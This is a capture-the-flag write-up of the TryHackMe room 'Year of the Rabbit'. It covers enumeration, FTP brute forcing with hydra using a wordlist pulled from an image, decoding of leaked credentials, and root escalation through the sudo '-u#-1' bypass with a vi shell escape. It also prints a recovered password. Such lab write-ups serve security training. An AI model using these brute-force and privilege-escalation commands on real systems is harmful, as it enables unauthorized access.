# Year of the Rabbit

***
![](https://tryhackme-images.s3.amazonaws.com/room-icons/c062ef0e0b4f70e51a2dafc5fc2bca0e.jpeg)

## Difficulty = Easy

***

Running our nmap scan we have -:


```bash
# Nmap 7.94 scan initiated Mon Oct 23 04:16:09 2023 as: nmap -p80,22,21 -sCV -T4 -v --min-rate=1000 -oN nmap.txt 10.10.184.53
Nmap scan report for 10.10.184.53
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 23 04:16:29 2023 -- 1 IP address (1 host up) scanned in 19.79 seconds
```

We can't login to `FTP` as anonymous user 


![](https://i.imgur.com/Ue9ZHST.png)


Navigating to port `80/HTTP` we have a default Apache2 website



![](https://i.imgur.com/nGondix.png)


- No vital information on `Page-Source`
- status code `404` in both `/sitemap.xml` and `/robots.txt`


Running dir/file bruteforce with `dirseach` we have only the `/assets` page


![](https://i.imgur.com/XT1GnQk.png)


Navigating to the `/assets` the first link truly got us **rick-rolled** 😂

![](https://i.imgur.com/EY5oCOM.png)

The second link, `/assets/style.css`, on the other hand gives us this information


![](https://i.imgur.com/YRKU9Of.png)


Checking `/sup3r_s3cr3t_fl4g.php` refers us to `/sup3r_s3cr3t_fl4g/` and then ask us to turn off **javascript**

![](https://i.imgur.com/EpMMxOe.png)

If you click `Ok` you get **rick-rolled** one more time 😭😂


![](https://i.imgur.com/3cJHyMG.png)

Making a request to `/sup3r_s3cr3t_fl4g/` with `curl` we can see we have a message, No wonder we are being referred 🤔


![](https://i.imgur.com/1W79sJq.png)

Well, start up `burpsuite` and intercept the `/sup3r_s3cr3t_fl4g.php` page then **send to repeater**

![](https://i.imgur.com/7rpCiII.png)


Click `Follow redirection` at the top-bar

![](https://i.imgur.com/KFz9j1T.png)



Nice, looks like this is what they don't want us to see, we are been referred to the page, `/intermediary.php?hidden_directory=/WExYY2Cv-qU`, then from here again to `http://10.10.184.53/sup3r_s3cr3t_fl4g.php`,
where the final **rick-roll** video plays

![](https://i.pinimg.com/originals/5f/d8/ca/5fd8ca9ef493ae16d1896d32a81cd193.gif)

Accessing `/intermediary.php?hidden_directory=/WExYY2Cv-qU` , i decided to use the **hidden_directory** parameter value directly, which is `/WExYY2Cv-qU`, we have an image

![](https://i.imgur.com/My70Hyn.png)

Download the image with the following command

```bash
$ wget http://10.10.184.53/WExYY2Cv-qU/Hot_Babe.png
```


Running the `strings` command on the image and scrolling down gives us this


![](https://i.imgur.com/qxi9ENY.png)


Running this command saves the passwords to a file called `passwd.txt`

```bash
$ strings Hot_Babe.png | tail -n 82 > passwd.txt
```

We can therefore bruteforce the `FTP` protocol with the following syntax using `hydra`

```bash
$ hydra -l ftpuser -P ./passwd.txt ftp://10.10.184.53 -V
```


![](https://i.imgur.com/wZKSAgI.png)

Login in with the username and password, `ftpuser:5iez1wGXKfPKQ` we have **Eli's_Creds.txt**


![](https://i.imgur.com/vNzuslp.png)

Download the file to your base machine with the `mget` command

![](https://i.imgur.com/fgr67EY.png)


Concatenating the `Eli's_Creds.txt` file gave us a brainfuck encoded text


![](https://i.imgur.com/cssdhQY.png)



Converting the brainfuck gave us **Eli's** credential

![](https://i.imgur.com/2AleGT7.png)

Login in via `SSH` we have a message from **root** to user **Gwendoline**


![](https://i.imgur.com/UkcTxv8.png)

running the `locate` command on the keyword **s3cr3t** we have

![](https://i.imgur.com/fRwgNc6.png)



Concatenating it gives us user **gwendoline** password

![](https://i.imgur.com/DFdLYhu.png)

switch user to **gwendoline**

```bash
$ su gwendoline
```

Running `sudo -l`, would i say we don't have permission to run `/usr/bin/vi /home/gwendoline/user.txt` as **root** 😆 


![](https://i.imgur.com/941ycmx.png)

After much lookups, using this payload we where able to view the file


```bash
$  sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

![](https://i.imgur.com/Tb7Whlt.png)

we can therefore get a root shell by adding **semi-colon** (`:`) and then `!/bin/bash` or you can also use `:shell`

![](https://i.imgur.com/TVsf3qv.png)

Hell yeah, we are root


![](https://i.imgur.com/mBlybTF.png)

Have a nice day ⛹️‍♂️


<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>




